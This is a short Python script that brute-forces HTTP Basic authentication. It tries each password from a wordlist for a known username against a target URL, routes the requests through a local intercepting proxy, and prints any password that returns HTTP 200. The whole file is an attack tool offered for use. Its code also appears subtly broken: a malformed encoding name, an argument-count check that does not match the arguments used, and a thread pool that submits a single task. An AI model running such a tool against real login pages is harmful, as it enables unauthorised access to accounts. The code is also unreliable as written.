#!/usr/bin/env python3



from requests import get
from sys import argv
from base64 import b64encode, b64decode
import concurrent.futures

def basic():
    if len(argv) < 3:
        print("argv[1] -> target => http://0.0.0.0/")
        print("argv[2] -> wordlist of password")
        print("argv[3] -> known user")
        print("argv[4] -> threads!")
    else:
        proxy = {"http": "http://127.0.0.1:8080"}
        f = open(argv[2], "r")
        for payload in f:
            payload = b64encode(bytes(argv[3]+":"+payload.strip(), "latin=1")).decode("ascii")
            headers = {"Authorization": f"Basic {payload}"}
            x = get(argv[1], headers=headers, proxies=proxy)
            if x.status_code == 200:
                print(f"Password found {payload} {b64decode(payload.encode('ascii')).decode('ascii')}")


def exec():
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(argv[4])) as executor:
        executor.submit(basic)


exec()
